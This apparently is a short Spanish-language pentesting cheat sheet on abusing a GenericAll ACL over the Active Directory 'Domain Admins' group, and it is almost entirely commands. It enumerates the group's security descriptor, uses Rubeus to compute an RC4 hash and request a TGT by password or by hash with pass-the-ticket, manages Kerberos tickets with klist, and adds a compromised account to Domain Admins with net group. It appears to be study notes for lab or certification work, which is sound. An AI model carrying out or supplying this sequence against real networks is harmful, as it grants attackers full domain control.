# Abuso ACL 

Tags: #AD #ACL #Windows 

## GenericAll sobre Grupo

```powershell
❯ import-module .\Microsoft.ActiveDirectory.Management.dll
❯ Get-ADGroup "Domain Admins" -Properties * | select -ExpandProperty ntSecurityDescriptor | Format-List  # Enumeramos los grupos de AD, sus propiedades 
❯ ./Rubeus.exe hash /password:Password@1    # Calcula el 'rc4_hmac'
❯ ./Rubeus.exe asktgt /user:groupwrite.user /password:Password@1 /ptt   # Solicitamos el TGT con la password
❯ ./Rubeus.exe asktgt /user:groupwrite.user /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ptt # Solicitamos el TGT con el 'Hash', el cual lo genera en base64 haciendo un Pass-The-Ticket
	# ptt = Pass-The-Ticket

❯ klist         # Mirar todos los tickets que se encuentran para los diferentes servicios 
❯ klist purge   # Eliminar los tickets que estan en cache

❯ net group "domain admins" /domain     # Ver los usuarios del 'domain admin'
❯ net group "domain admins" user.hacked /add /domain  # Agregamos el usuario comprometido al 'domain admin'
❯ net group "domain admins" /domain     # Verificar que el nuevo usuario de ha añadido 
```